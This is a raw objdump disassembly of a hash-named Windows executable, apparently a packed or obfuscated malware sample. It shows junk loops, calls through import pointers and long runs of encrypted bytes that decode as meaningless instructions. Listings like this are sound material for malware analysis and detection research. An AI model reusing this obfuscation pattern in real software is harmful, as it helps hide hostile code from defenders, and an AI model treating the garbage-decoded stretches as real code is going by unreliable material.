
f9c0e3ec9cfa13da21aae624e140dd2f7903e47281253b90758c1a355de2d992.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x98
  401009:	mov    DWORD PTR ds:0x433717,0x1c
  401013:	cmp    DWORD PTR ds:0x433717,0x0
  40101a:	je     0x40106d
  401020:	cmp    DWORD PTR ds:0x433717,0x6
  401027:	jne    0x401040
  40102d:	push   0x8196
  401032:	push   DWORD PTR [ebp-0xc]
  401035:	push   0x6434
  40103a:	call   DWORD PTR ds:0x412268
  401040:	cmp    DWORD PTR ds:0x433717,0x7
  401047:	jne    0x40105b
  40104d:	xor    eax,eax
  40104f:	xor    eax,DWORD PTR ds:0x433717
  401055:	dec    eax
  401056:	mov    ds:0x433717,eax
  40105b:	mov    eax,ds:0x433717
  401060:	dec    eax
  401061:	mov    ds:0x433717,eax
  401066:	jmp    0x401013
  40106b:	or     ecx,eax
  40106d:	mov    eax,ds:0x413b34
  401072:	mov    DWORD PTR [ebp-0x18],eax
  401075:	sub    DWORD PTR ds:0x43371b,0x1705
  40107f:	mov    eax,ds:0x413c44
  401084:	sub    DWORD PTR ds:0x43371f,edx
  40108a:	mov    DWORD PTR [ebp-0x48],eax
  40108d:	xor    eax,ecx
  40108f:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  401096:	add    eax,DWORD PTR ds:0x433753
  40109c:	mov    DWORD PTR [ebp-0x1c],0xf89c8532
  4010a3:	sbb    eax,eax
  4010a5:	mov    eax,DWORD PTR [ebp-0x10]
  4010a8:	push   ebx
  4010a9:	movzx  ebx,BYTE PTR ds:0x43372f
  4010b0:	sbb    ebx,DWORD PTR ds:0x433713
  4010b6:	mov    DWORD PTR ds:0x43372f,ebx
  4010bc:	push   esi
  4010bd:	mov    esi,0x7510854
  4010c2:	xor    eax,esi
  4010c4:	push   edi
  4010c5:	or     ecx,ebx
  4010c7:	mov    edi,0x32729b
  4010cc:	add    eax,edi
  4010ce:	and    DWORD PTR ds:0x4337ab,0x264c
  4010d8:	mov    DWORD PTR [ebp-0x38],eax
  4010db:	mov    DWORD PTR ds:0x43372f,0x18
  4010e5:	cmp    DWORD PTR ds:0x43372f,0x0
  4010ec:	je     0x401146
  4010f2:	cmp    DWORD PTR ds:0x43372f,0xc
  4010f9:	jne    0x401108
  4010ff:	push   DWORD PTR [ebp-0x24]
  401102:	call   DWORD PTR ds:0x4120b4
  401108:	cmp    DWORD PTR ds:0x43372f,0xd
  40110f:	jne    0x401122
  401115:	mov    ebx,DWORD PTR ds:0x43372f
  40111b:	dec    ebx
  40111c:	mov    DWORD PTR ds:0x43372f,ebx
  401122:	xor    ebx,ebx
  401124:	add    ebx,DWORD PTR ds:0x43372f
  40112a:	dec    ebx
  40112b:	mov    DWORD PTR ds:0x43372f,ebx
  401131:	jmp    0x4010e5
  401136:	mov    ecx,DWORD PTR ds:0x4336f7
  40113c:	mov    eax,ds:0x4337b3
  401141:	sub    ecx,eax
  401143:	add    ecx,DWORD PTR [ecx+eax*1]
  401146:	mov    DWORD PTR [ebp-0x44],0xf89cb531
  40114d:	mov    DWORD PTR [ebp-0x54],0xf89f0531
  401154:	mov    DWORD PTR [ebp-0x4c],0xf89c85f1
  40115b:	or     DWORD PTR ds:0x43379b,0x1296
  401165:	mov    DWORD PTR [ebp-0x3c],0xf89c85d1
  40116c:	mov    eax,DWORD PTR [ebp-0x10]
  40116f:	sub    DWORD PTR ds:0x43367f,0x1011
  401179:	xor    eax,esi
  40117b:	add    eax,edi
  40117d:	mov    DWORD PTR [ebp-0xc],eax
  401180:	sbb    DWORD PTR ds:0x43369f,0x6b1e
  40118a:	mov    DWORD PTR [ebp-0x28],0xf89c853e
  401191:	mov    BYTE PTR [ebp-0x11],0x67
  401195:	mov    eax,DWORD PTR [ebp-0x10]
  401198:	xor    DWORD PTR ds:0x4336db,0x46ad
  4011a2:	xor    eax,esi
  4011a4:	add    eax,edi
  4011a6:	jmp    0x401347
  4011ab:	jb     0x401145
  4011ad:	fsub   DWORD PTR [edx]
  4011af:	lock bound esi,QWORD PTR [eax+0x68]
  4011b3:	push   ecx
  4011b4:	in     al,0x70
  4011b6:	or     BYTE PTR [ebx+0x45],ch
  4011b9:	push   ds
  4011ba:	ja     0x40123a
  4011bc:	jle    0x40123c
  4011be:	jle    0x4011ba
  4011c0:	jg     0x401240
  4011c2:	jle    0x401192
  4011c4:	xlat   BYTE PTR ds:[ebx]
  4011c5:	cmp    eax,0xcfd339d5
  4011ca:	rol    edx,1
  4011cc:	pop    es
  4011cd:	add    al,0x3
  4011cf:	add    dh,bh
  4011d1:	add    BYTE PTR [edi],cl
  4011d3:	xor    ecx,DWORD PTR [edi]
  4011d5:	rcr    BYTE PTR [eax],0xc7
  4011d8:	adc    BYTE PTR [edi],bl
  4011da:	mov    ecx,0xddb70058
  4011df:	push   cs
  4011e0:	out    dx,eax
  4011e1:	mov    ebp,0x8e03d6db
  4011e6:	es mov esi,0x1541a2f4
  4011ec:	lods   eax,DWORD PTR ds:[esi]
  4011ed:	fiadd  WORD PTR [esi+0x1f]
  4011f0:	data16 in al,dx
  4011f2:	outs   dx,DWORD PTR ds:[esi]
  4011f3:	or     edx,DWORD PTR [ecx]
  4011f5:	pushf  
  4011f6:	js     0x4011ce
  4011f8:	inc    eax
  4011f9:	stos   BYTE PTR es:[edi],al
  4011fa:	push   ebx
  4011fb:	sub    eax,0xad3cc4d1
  401200:	mov    bh,BYTE PTR [ebx-0x3b]
  401203:	stos   DWORD PTR es:[edi],eax
  401204:	push   es
  401205:	(bad)  
  401206:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  40120c:	jmp    0x40123e
  40120e:	mov    ebp,ecx
  401210:	dec    edi
  401211:	out    0xa6,al
  401213:	inc    ecx
  401214:	call   DWORD PTR [edi-0x2556f868]
  40121a:	mov    ebp,0x5536ed4d
  40121f:	and    esi,DWORD PTR [edx-0x43619116]
  401225:	jnp    0x401238
  401227:	ret    
  401228:	xchg   edx,eax
  401229:	and    esp,edx
  40122b:	jmp    0x40128b
  40122d:	ret    0xb8e4
  401230:	lock jmp 0xd765:0x74cf3192
  401238:	and    ch,cl
  40123a:	add    bl,cl
  40123c:	adc    DWORD PTR [ecx-0x5a],edx
  40123f:	xor    eax,0x78616f03
  401244:	or     BYTE PTR [ecx],dh
  401246:	fisttp QWORD PTR [esi+0x7f752854]
  40124c:	(bad)
  401251:	or     ebx,DWORD PTR [ebx+0x55]
  401254:	fst    st(6)
  401256:	or     ebx,edx
  401258:	pop    esp
  401259:	fstp   DWORD PTR [ecx]
  40125b:	jno    0x4011fb
  40125d:	inc    esi
  40125e:	dec    ebx
  40125f:	aaa    
  401260:	adc    eax,0x1a29772b
  401265:	sar    DWORD PTR [esi],cl
  401267:	dec    edi
  401268:	call   0x9170b739
  40126d:	cmc    
  40126e:	outs   dx,BYTE PTR ds:[esi]
  40126f:	retf   
  401270:	xor    BYTE PTR [ebp+0x1d],ch
  401273:	leave  
  401274:	fild   DWORD PTR [esi-0x4d]
  401277:	and    eax,0xfb99bd75
  40127c:	neg    BYTE PTR [edx]
  40127e:	es push es
  401280:	push   edi
  401281:	sbb    dl,BYTE PTR [edi-0x4d34954a]
  401287:	rol    DWORD PTR [ebx+ecx*1],1
  40128a:	mov    DWORD PTR [ecx+0x5],edi
  40128d:	jl     0x40120f
  40128f:	dec    ebx
  401290:	hlt    
  401291:	mov    ebp,0x720234ad
  401296:	ja     0x4012d7
  401298:	mov    ah,0xc8
  40129a:	out    0xff,al
  40129c:	mov    ah,BYTE PTR [esi+0x7c419a90]
  4012a2:	jmp    0x427db47f
  4012a7:	mov    ebp,0x57172a3f
  4012ac:	inc    edx
  4012ad:	fidiv  DWORD PTR [edi-0xaf77b3e]
  4012b3:	nop
  4012b4:	jne    0x4012e8
  4012b6:	ins    DWORD PTR es:[edi],dx
  4012b7:	cmp    al,0xa2
  4012b9:	mov    esp,0xe77b457
  4012be:	sbb    BYTE PTR [edi],al
  4012c0:	xchg   esp,eax
  4012c1:	jno    0x4012fc
  4012c3:	sar    DWORD PTR [ecx],0x69
  4012c6:	scas   al,BYTE PTR es:[edi]
  4012c7:	je     0x40128d
  4012c9:	sub    al,0x35
  4012cb:	adc    bl,bl
  4012cd:	test   ebp,ebx
  4012cf:	inc    eax
  4012d0:	psubusb mm0,QWORD PTR [esi+0x68]
  4012d4:	cmp    BYTE PTR [eax-0x39],bh
  4012d7:	or     eax,DWORD PTR [eax+0x7f]
  4012da:	inc    ebp
  4012db:	mul    BYTE PTR [ecx+0x28]
  4012de:	fsub   QWORD PTR [ebx-0x1cd92690]
  4012e4:	test   al,0x42
  4012e6:	hlt    
  4012e7:	push   edi
  4012e8:	shl    DWORD PTR [bx-0x77f4],1
  4012ed:	pop    ebx
  4012ee:	ret    
  4012ef:	lock arpl WORD PTR [ecx-0x3f82c8ad],bx
  4012f6:	iret   
  4012f7:	dec    ecx
  4012f8:	inc    ecx
  4012f9:	mov    DWORD PTR [ecx-0xc0029fe],ebp
  4012ff:	test   eax,0x50f94a86
  401304:	pop    esp
  401305:	mov    ah,0xdc
  401307:	and    cl,cl
  401309:	add    al,0x78
  40130b:	sbb    eax,0x2290c3ef
  401310:	pusha  
  401311:	loopne 0x401369
  401313:	xchg   ecx,eax
  401314:	call   0xa211:0x79cda921
  40131b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40131c:	call   DWORD PTR [ebx]
  40131e:	mov    esp,0xe59731c5
  401323:	fisubr WORD PTR [esi+0x242ce148]
  401329:	xlat   BYTE PTR ds:[ebx]
  40132a:	add    ebp,DWORD PTR [bx+di-0x12]
  40132e:	daa    
  40132f:	cmp    ecx,ebx
  401331:	pop    ds
  401332:	(bad)  
  401333:	jle    0x401355
  401335:	sbb    ecx,0x4f
  401338:	or     BYTE PTR [ebp-0x60],dh
  40133b:	mov    bh,0x42
  40133d:	cmp    eax,0xa80d299b
  401342:	pop    ds
  401343:	push   ds
  401344:	je     0x401363
  401346:	(bad)  
  401347:	mov    DWORD PTR [ebp-0xc],eax
  40134a:	and    DWORD PTR ds:0x4336d3,0x0
  401354:	jmp    0x401366
  401359:	mov    ebx,DWORD PTR ds:0x4336d3
  40135f:	inc    ebx
  401360:	mov    DWORD PTR ds:0x4336d3,ebx
  401366:	cmp    DWORD PTR ds:0x4336d3,0x10
  40136d:	jae    0x401543
  401373:	cmp    DWORD PTR ds:0x4336d3,0x12
  40137a:	jne    0x401393
  401380:	push   0x3bad
  401385:	push   0x706b
  40138a:	push   DWORD PTR [ebp-0x20]
  40138d:	call   DWORD PTR ds:0x412284
  401393:	jmp    0x401359
  401398:	or     DWORD PTR ds:0x43368b,0x43367f
  4013a2:	jmp    0x401543
  4013a7:	dec    ebp
  4013a8:	push   0xb1638b43
  4013ad:	push   ebp
  4013ae:	push   0xd91cd24
  4013b3:	pop    ebp
  4013b4:	and    dl,BYTE PTR [edi+0x7e7ffaaf]
  4013ba:	jle    0x4013b6
  4013bc:	jg     0x40143c
  4013be:	jle    0x401371
  4013c0:	inc    esi
  4013c1:	push   es
  4013c2:	popa   
  4013c3:	mov    bl,BYTE PTR [esi+0x41]
  4013c6:	inc    edi
  4013c8:	adc    BYTE PTR [eax+0x3a],dl
  4013cb:	xchg   ebx,eax
  4013cc:	scas   eax,DWORD PTR es:[edi]
  4013cd:	pop    edx
  4013ce:	pushf  
  4013cf:	lds    esp,FWORD PTR [ecx-0x31]
  4013d2:	cmp    al,0x68
  4013d4:	lea    esi,[eax-0x1b]
  4013d7:	call   0xcdd0:0x477e2dcb
  4013de:	in     eax,0xa3
  4013e0:	add    al,0x5f
  4013e2:	and    BYTE PTR [esi+0x52],bh
  4013e5:	sub    edi,ebp
  4013e7:	pop    es
  4013e8:	outs   dx,BYTE PTR ds:[esi]
  4013e9:	leave  
  4013ea:	stc    
  4013eb:	out    dx,al
  4013ec:	addr16 mov ch,0x19
  4013ef:	push   ds
  4013f0:	out    dx,eax
  4013f1:	jns    0x4013d8
  4013f3:	rcl    DWORD PTR [ecx],1
  4013f5:	xchg   ecx,eax
  4013f6:	in     al,dx
  4013f7:	xchg   DWORD PTR [ebx-0x39],ebp
  4013fa:	mov    bh,0x8b
  4013fc:	cmp    DWORD PTR [edi+0x163c3cbb],esi
  401402:	or     ebx,DWORD PTR [esi]
  401404:	aad    0x39
  401406:	or     al,0x20
  401408:	fdivp  st(0),st
  40140a:	xlat   BYTE PTR ds:[ebx]
  40140b:	jnp    0x4013b0
  40140d:	mov    dl,0xef
  40140f:	sub    BYTE PTR [ecx-0x7e],cl
  401412:	imul   esp,DWORD PTR [esi],0xcc7b1cdf
  401418:	mov    eax,0x3773464f
  40141d:	(bad)  
  40141f:	inc    edx
  401420:	dec    edi
  401421:	mov    cl,0xbb
  401423:	inc    ebx
  401424:	stc    
  401425:	hlt    
  401426:	or     al,0x5
  401428:	jge    0x401413
  40142a:	ret    0xd2e4
  40142d:	test   DWORD PTR ds:0xfa9e9bdb,ebp
  401433:	fnsave ds:0xca886b67
  401439:	fsubr  st(5),st
  40143b:	jne    0x4013c6
  40143d:	and    al,0x2b
  40143f:	mov    ebp,0x3648a90b
  401444:	and    al,0xd8
  401446:	mov    dl,0x1
  401448:	mov    edx,0x1703962b
  40144d:	je     0x4013ee
  40144f:	pop    ebx
  401450:	clc    
  401451:	call   0x7b02:0xb0913d7
  401458:	mov    bl,0x4
  40145a:	dec    edi
  40145b:	repz push esp
  40145d:	aaa    
  40145e:	adc    ecx,DWORD PTR [ebp+0xbf89431]
  401464:	dec    edi
  401465:	cld    
  401466:	popf   
  401467:	mov    al,ds:0x12dbc73e
  40146c:	scas   eax,DWORD PTR es:[edi]
  40146d:	mov    ?,esp
  40146f:	adc    ebx,esi
  401471:	sub    dl,BYTE PTR [eax+0x24]
  401474:	mov    esi,0x8b476fc
  401479:	push   ds
  40147a:	call   0xd5bc:0x7ba0c03f
  401481:	mov    al,fs:0xbfca315b
  401487:	mov    ecx,0xa33a2ddd
  40148c:	and    eax,0xece2fd42
  401491:	pop    edi
  401492:	fsub   st(6),st
  401494:	sub    bh,dl
  401496:	int    0xa4
  401498:	mov    dh,0x58
  40149a:	dec    edx
  40149b:	pusha  
  40149c:	and    al,0x38
  40149e:	pop    es
  40149f:	test   BYTE PTR [ecx-0x1],cl
  4014a2:	or     DWORD PTR [ecx-0x22],esp
  4014a5:	mov    ch,0xf1
  4014a7:	lahf   
  4014a8:	lods   al,BYTE PTR ds:[esi]
  4014a9:	push   edi
  4014aa:	and    DWORD PTR [ecx-0x71],ebp
  4014ad:	loop   0x4014ab
  4014af:	das    
  4014b0:	mov    eax,ds:0x41b441eb
  4014b5:	aam    0x16
  4014b7:	xchg   edi,eax
  4014b8:	xlat   BYTE PTR ds:[ebx]
  4014b9:	cs jmp 0xd529f0a
  4014bf:	adc    DWORD PTR [edx],ebp
  4014c1:	loopne 0x401468
  4014c3:	test   ah,ah
  4014c5:	inc    edx
  4014c6:	int    0x60
  4014c8:	lods   eax,DWORD PTR ds:[esi]
  4014c9:	sbb    esp,DWORD PTR [esp+0x5a650100]
  4014d0:	repz sbb eax,0xf3d931a3
  4014d6:	into   
  4014d7:	into   
  4014d8:	mov    ch,0x92
  4014da:	push   edi
  4014db:	shr    ebp,cl
  4014dd:	adc    ecx,DWORD PTR [ebp+0x62]
  4014e0:	test   eax,0x8f979527
  4014e5:	sbb    cl,bh
  4014e7:	sbb    BYTE PTR [ebp-0x548f01c4],al
  4014ed:	or     eax,0x2e37893d
  4014f2:	cmp    DWORD PTR [edx+0x47],edi
  4014f5:	jae    0x401480
  4014f7:	jae    0x40150f
  4014f9:	dec    ecx
  4014fa:	push   ss
  4014fb:	outs   dx,BYTE PTR ds:[esi]
  4014fc:	scas   eax,DWORD PTR es:[edi]
  4014fd:	xor    DWORD PTR [esp+eax*2+0x2e],eax
  401501:	dec    eax
  401502:	inc    ecx
  401503:	(bad)  
  401504:	fdivp  st(5),st
  401506:	scas   al,BYTE PTR es:[edi]
  401507:	bts    ecx,esi
  40150a:	jnp    0x4014ef
  40150c:	pop    esp
  40150d:	ja     0x401527
  40150f:	or     ch,BYTE PTR [edx]
  401511:	push   ss
  401512:	xor    al,0x7e
  401514:	mov    WORD PTR [ecx-0x467ffb5c],gs
  40151a:	inc    ecx
  40151b:	push   ebx
  40151c:	scas   eax,DWORD PTR es:[edi]
  40151d:	push   eax
  40151e:	add    edx,eax
  401520:	jne    0x4014c9
  401522:	inc    ecx
  401523:	dec    eax
  401524:	sti    
  401525:	loopne 0x4014d0
  401527:	or     ah,ah
  401529:	ins    BYTE PTR es:[edi],dx
  40152a:	mov    fs,esp
  40152c:	dec    esp
  40152d:	pop    es
  40152e:	sub    edx,DWORD PTR cs:0x9db03892
  401535:	inc    BYTE PTR [ebp-0x167c0fe]
  40153b:	mov    eax,ds:0x8387e352
  401540:	pushf  
  401541:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401542:	ror    BYTE PTR [ebx+0x1d31c445],cl
  401548:	(bad)  
  401549:	ss inc ebx
  40154b:	add    BYTE PTR [ebx],dh
  40154d:	(bad)  
  40154e:	neg    ecx
  401550:	jmp    0x4016f1
  401555:	cli    
  401556:	fcomp  QWORD PTR [edx-0x4caea7e9]
  40155c:	jno    0x4014f6
  40155e:	cmp    ah,BYTE PTR [ebx-0x43bc701d]
  401564:	and    al,BYTE PTR [esi]
  401566:	jge    0x4015e6
  401568:	jle    0x401564
  40156a:	jg     0x4015ea
  40156c:	jle    0x401542
  40156e:	hlt    
  40156f:	stos   BYTE PTR es:[edi],al
  401570:	out    0xbf,eax
  401572:	push   ds
  401573:	int3   
  401574:	add    al,0x4e
  401576:	int3   
  401577:	jp     0x4015e4
  401579:	pop    edi
  40157a:	jne    0x4015ed
  40157c:	(bad)  
  40157e:	dec    edx
  40157f:	in     al,dx
  401580:	ror    DWORD PTR [ebp+0x11ee723f],1
  401586:	ror    BYTE PTR [ebx],1
  401588:	mov    cl,0xe7
  40158a:	inc    esp
  40158b:	mov    ebx,ds
  40158d:	cmp    cl,BYTE PTR ds:0x581a8c2c
  401593:	or     bh,BYTE PTR [eax-0x7de03fea]
  401599:	jmp    0xb3d5:0xba4f714b
  4015a0:	jmp    0x122a6a16
  4015a5:	jge    0x4015c7
  4015a7:	cdq    
  4015a8:	mov    ebx,0xcc1b5512
  4015ad:	mov    BYTE PTR [ebx+0x7e],0x51
  4015b1:	sbb    eax,0xf7662135
  4015b6:	xchg   edi,eax
  4015b7:	ret    0x69e
  4015ba:	(bad)  [ebx+edi*1]
  4015bd:	add    al,0x9f
  4015bf:	add    al,0x9f
  4015c1:	jmp    DWORD PTR [ecx]
  4015c3:	ss ins BYTE PTR es:[edi],dx
  4015c5:	popf   
  4015c6:	stos   BYTE PTR es:[edi],al
  4015c7:	add    DWORD PTR [edi+0x4c],0xffffff84
  4015cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4015cc:	sar    BYTE PTR [ebx-0x6],0xb9
  4015d0:	push   ebp
  4015d1:	inc    DWORD PTR [edi+0x4ff10a95]
  4015d7:	adc    ecx,DWORD PTR [edx-0x70]
  4015da:	in     al,0x1
  4015dc:	mov    bh,0x4
  4015de:	pop    edx
  4015df:	or     DWORD PTR cs:[ebp-0x56a414ad],0xffffffc7
  4015e7:	std    
  4015e8:	nop
  4015e9:	mov    al,ds:0x2001e549
  4015ee:	aaa    
  4015ef:	shl    DWORD PTR [esi],cl
  4015f1:	dec    edi
  4015f2:	inc    ecx
  4015f3:	mov    dl,0x53
  4015f5:	pop    edx
  4015f6:	inc    ah
  4015f8:	cmp    al,0xde
  4015fa:	pop    ebx
  4015fb:	jge    0x401601
  4015fd:	mov    bl,0x75
  4015ff:	and    eax,DWORD PTR [ebp-0x348b1e4d]
  401605:	xor    edi,esi
  401607:	int3   
  401608:	imul   esi,eax,0x3c
  40160b:	xor    ebp,DWORD PTR [edi-0x5de6c708]
  401611:	test   al,0xbf
  401613:	nop
  401614:	imul   ebx,DWORD PTR [eax+edi*1+0x30ec00e6],0x78
  40161c:	addr16 and eax,0x426cc218
  401622:	popf   
  401623:	neg    dh
  401625:	test   DWORD PTR [ebx],0x303610fa
  40162b:	push   esi
  40162c:	iret   
  40162d:	pop    esp
  40162e:	inc    esp
  40162f:	test   DWORD PTR [ebx],esp
  401631:	push   ds
  401632:	sbb    eax,0x190d0e27
  401637:	or     al,0xce
  401639:	and    al,0xde
  40163b:	out    dx,al
  40163c:	mov    edx,0x4df0e80b
  401641:	test   eax,0x5b33d65b
  401646:	sub    ch,BYTE PTR [ebx-0xe]
  401649:	jge    0x401638
  40164b:	in     al,dx
  40164c:	fcmovu st,st(5)
  40164e:	sub    ebp,eax
  401650:	mov    ebp,edi
  401652:	lock (bad) 
  401654:	or     ebx,edx
  401656:	lods   eax,DWORD PTR ds:[esi]
  401657:	jne    0x4016bf
  401659:	xor    al,0x15
  40165b:	fcom   DWORD PTR [edx-0x6e]
  40165f:	xor    DWORD PTR [edi-0x50b0a136],esi
  401665:	in     al,dx
  401666:	xor    DWORD PTR [edx-0xe],edx
  401669:	pop    edi
  40166a:	jp     0x401649
  40166c:	mov    ?,WORD PTR [ebp+ecx*1-0x61]
  401670:	xchg   ecx,eax
  401671:	xor    al,0xf8
  401673:	ja     0x4016c2
  401675:	out    dx,eax
  401676:	inc    DWORD PTR [ebx*2+0x22597365]
  40167d:	addr16 cwde 
  40167f:	lods   al,BYTE PTR ds:[esi]
  401680:	push   esp
  401681:	jnp    0x4016aa
  401683:	iret   
  401684:	(bad)  
  401685:	jbe    0x40169a
  401687:	jg     0x401665
  401689:	pushf  
  40168a:	pop    eax
  40168b:	addr16 pusha 
  40168d:	cwde   
  40168e:	dec    esp
  40168f:	ret    0x3495
  401692:	adc    bh,BYTE PTR gs:[ecx-0x37]
  401696:	(bad)  
  401697:	xor    esp,DWORD PTR [bx-0x4f56]
  40169c:	xor    DWORD PTR [ebp-0x7ad01a16],edx
  4016a2:	pop    ss
  4016a3:	add    al,0x54
  4016a5:	loopne 0x40170b
  4016a7:	cmp    ecx,DWORD PTR [edx]
  4016a9:	lea    esp,[ecx+0x2cd513fd]
  4016af:	sbb    al,0x7b
  4016b1:	jns    0x40172e
  4016b3:	call   DWORD PTR [ecx+0x9]
  4016b6:	xchg   edi,eax
  4016b7:	mov    WORD PTR [edx-0x68],ds
  4016ba:	pop    edx
  4016bb:	dec    BYTE PTR [edi+ebp*8]
  4016be:	fadd   QWORD PTR [edx-0x1c78ae16]
  4016c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016c5:	dec    ebp
  4016c6:	in     al,dx
  4016c7:	call   0xfb10:0x96a45f57
  4016ce:	in     al,0xbe
  4016d0:	test   eax,0xaa0cb0e3
  4016d5:	mov    ?,esp
  4016d7:	mov    ebx,0x8f05b898
  4016dc:	or     BYTE PTR [esi-0x72],dh
  4016df:	and    esi,DWORD PTR [edi-0x22]
  4016e2:	in     al,dx
  4016e3:	cmp    BYTE PTR [eax+0x13],0xc
  4016e7:	jo     0x401698
  4016e9:	pop    esi
  4016ea:	inc    ecx
  4016eb:	mov    ebx,0xdb816d6e
  4016f0:	icebp  
  4016f1:	add    eax,edi
  4016f3:	mov    DWORD PTR [ebp-0x34],eax
  4016f6:	mov    eax,DWORD PTR [ebp-0x44]
  4016f9:	xor    eax,esi
  4016fb:	sbb    ecx,ecx
  4016fd:	add    eax,edi
  4016ff:	mov    DWORD PTR [ebp-0x30],eax
  401702:	mov    eax,DWORD PTR [ebp-0x28]
  401705:	and    DWORD PTR ds:0x43375f,0x0
  40170f:	jmp    0x401721
  401714:	mov    ebx,DWORD PTR ds:0x43375f
  40171a:	inc    ebx
  40171b:	mov    DWORD PTR ds:0x43375f,ebx
  401721:	cmp    DWORD PTR ds:0x43375f,0x18
  401728:	jae    0x40176c
  40172e:	cmp    DWORD PTR ds:0x43375f,0xa
  401735:	jne    0x40174b
  40173b:	push   0x7b82
  401740:	push   0x1a57
  401745:	call   DWORD PTR ds:0x41226c
  40174b:	cmp    DWORD PTR ds:0x43375f,0x9
  401752:	jne    0x401767
  401758:	xor    ebx,ebx
  40175a:	xor    ebx,DWORD PTR ds:0x43375f
  401760:	inc    ebx
  401761:	mov    DWORD PTR ds:0x43375f,ebx
  401767:	jmp    0x401714
  40176c:	xor    eax,esi
  40176e:	sbb    DWORD PTR ds:0x433683,0x47a9
  401778:	add    eax,edi
  40177a:	dec    DWORD PTR ds:0x433697
  401780:	mov    DWORD PTR [ebp-0x2c],eax
  401783:	lea    eax,[ebp-0x98]
  401789:	mov    DWORD PTR [ebp-0x8],eax
  40178c:	movzx  ecx,WORD PTR ds:0x43368b
  401793:	and    ecx,DWORD PTR ds:0x4336db
  401799:	mov    DWORD PTR ds:0x43368b,ecx
  40179f:	mov    eax,DWORD PTR [ebp-0x10]
  4017a2:	mov    DWORD PTR [ebp-0x24],eax
  4017a5:	and    DWORD PTR ds:0x4337af,0x0
  4017af:	jmp    0x4017c3
  4017b4:	xor    ebx,ebx
  4017b6:	or     ebx,DWORD PTR ds:0x4337af
  4017bc:	inc    ebx
  4017bd:	mov    DWORD PTR ds:0x4337af,ebx
  4017c3:	cmp    DWORD PTR ds:0x4337af,0x1c
  4017ca:	jae    0x40184e
  4017d0:	cmp    DWORD PTR ds:0x4337af,0x11
  4017d7:	jne    0x4017f0
  4017dd:	push   DWORD PTR [ebp-0x14]
  4017e0:	push   0x35e4
  4017e5:	push   0x7b35
  4017ea:	call   DWORD PTR ds:0x412270
  4017f0:	cmp    DWORD PTR ds:0x4337af,0x10
  4017f7:	jne    0x40180a
  4017fd:	mov    ebx,DWORD PTR ds:0x4337af
  401803:	inc    ebx
  401804:	mov    DWORD PTR ds:0x4337af,ebx
  40180a:	jmp    0x4017b4
  40180f:	and    DWORD PTR ds:0x433763,0x0
  401819:	mov    eax,ds:0x433763
  40181e:	inc    eax
  40181f:	mov    ds:0x433763,eax
  401824:	cmp    DWORD PTR ds:0x433763,0x27
  40182b:	jne    0x401841
  401831:	push   0x1cc5
  401836:	push   0x4336a3
  40183b:	call   DWORD PTR ds:0x412338
  401841:	cmp    DWORD PTR ds:0x433763,0x1d
  401848:	jb     0x401819
  40184e:	mov    eax,DWORD PTR [ebp-0x1c]
  401851:	xor    ebx,DWORD PTR ds:0x43379f
  401857:	mov    DWORD PTR [ebp-0x20],eax
  40185a:	and    DWORD PTR ds:0x4337ab,0x0
  401864:	jmp    0x401878
  401869:	xor    ecx,ecx
  40186b:	xor    ecx,DWORD PTR ds:0x4337ab
  401871:	inc    ecx
  401872:	mov    DWORD PTR ds:0x4337ab,ecx
  401878:	cmp    DWORD PTR ds:0x4337ab,0x12
  40187f:	jae    0x4018d1
  401885:	cmp    DWORD PTR ds:0x4337ab,0x4
  40188c:	jne    0x4018b2
  401892:	push   0x6e91
  401897:	push   DWORD PTR [ebp-0x10]
  40189a:	push   DWORD PTR [ebp-0x24]
  40189d:	push   0x5930
  4018a2:	push   0x63f1
  4018a7:	push   0x153a
  4018ac:	call   DWORD PTR ds:0x412274
  4018b2:	cmp    DWORD PTR ds:0x4337ab,0x3
  4018b9:	jne    0x4018cc
  4018bf:	mov    ecx,DWORD PTR ds:0x4337ab
  4018c5:	inc    ecx
  4018c6:	mov    DWORD PTR ds:0x4337ab,ecx
  4018cc:	jmp    0x401869
  4018d1:	mov    ebx,0xf89c853d
  4018d6:	jmp    0x401a77
  4018db:	or     ecx,esi
  4018dd:	out    0x8,al
  4018df:	jecxz  0x401911
  4018e1:	icebp  
  4018e2:	int    0x17
  4018e4:	add    eax,0x69c06ade
  4018e9:	push   esi
  4018ea:	jo     0x40186e
  4018ec:	jp     0x40196c
  4018ee:	jle    0x4018ea
  4018f0:	jg     0x401970
  4018f2:	jle    0x40187a
  4018f4:	mov    eax,0xd2ef9ebe
  4018f9:	mov    eax,0x8ef09512
  4018fe:	loope  0x401882
  401900:	mov    bl,0xd1
  401902:	add    eax,0x75c72b31
  401907:	lods   al,BYTE PTR ds:[esi]
  401908:	jle    0x40191f
  40190a:	les    esi,FWORD PTR [edx-0x61c8f163]
  401910:	jle    0x401940
  401912:	add    edx,ebx
  401914:	out    dx,eax
  401915:	fwait
  401916:	sbb    al,0x42
  401918:	loopne 0x4018d6
  40191a:	xchg   ebp,eax
  40191b:	sub    eax,0xa8b6f612
  401920:	add    al,0x49
  401922:	popa   
  401923:	icebp  
  401924:	push   ebp
  401925:	stc    
  401926:	xchg   esp,eax
  401927:	fs mov esp,0xebd6b46a
  40192d:	jl     0x4018b9
  40192f:	mov    DWORD PTR [ebx-0x7a],esp
  401932:	mov    dh,0x33
  401934:	cmp    DWORD PTR [esi+0x358cc5be],edx
  40193a:	jbe    0x40197c
  40193c:	inc    esp
  40193d:	mov    gs,WORD PTR [ecx+0x5a]
  401940:	add    dh,bh
  401942:	frstor [edi-0x3d0c4962]
  401948:	stos   BYTE PTR es:[edi],al
  401949:	(bad)  
  40194a:	sbb    al,0xb9
  40194c:	cmp    esi,DWORD PTR [edx+0x2d235056]
  401952:	or     eax,0xc43204f4
  401957:	lods   al,BYTE PTR ds:[esi]
  401958:	push   eax
  401959:	in     al,0x73
  40195b:	mov    cl,0x77
  40195d:	aas    
  40195e:	icebp  
  40195f:	sub    al,0xf0
  401961:	and    ecx,DWORD PTR [edx-0x65]
  401964:	fstp   TBYTE PTR [esi]
  401966:	mov    ch,ah
  401968:	jg     0x4019b4
  40196a:	fisttp QWORD PTR [eax]
  40196c:	or     al,0xb3
  40196e:	jecxz  0x40195d
  401970:	call   0x7be9:0xddccf319
